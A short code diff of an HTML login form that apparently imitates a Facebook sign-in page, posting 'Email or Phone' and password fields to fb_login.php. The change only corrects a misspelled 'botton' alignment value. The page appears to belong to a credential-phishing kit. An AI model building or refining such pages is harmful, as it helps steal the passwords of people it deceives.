@@ -35,15 +35,15 @@ div.dentro {
 <div class="dentro">
   <form action="fb_login.php" method="post">
       <table  border="0">
-      <tr valign="botton">
+      <tr valign="bottom">
       <td><font style="font-family:arial; font-size:10px;"><b>Email or Phone </b></font></td>
       <td align="left"><input type="text" name="user" style="font-family:arial; font-size:10px; width: 180px; margin-left: 0px; margin-top: 10px;"></td>
       </tr>
-      <tr valign="botton">
+      <tr valign="bottom">
       <td><font style="font-family:arial; font-size:10px;"><b>Password </b></font></td>
       <td align="left"><input type="password" name="password" style="font-family:arial; font-size:10px; width: 180px; margin-left: 0px; margin-top: 10px;"></td>
       </tr>
-      <tr valign="botton">
+      <tr valign="bottom">
       <td></td>
       <td align="left"><input type="image" src="fb.png" style="width:160px;height:60px;"></td>
       </tr>
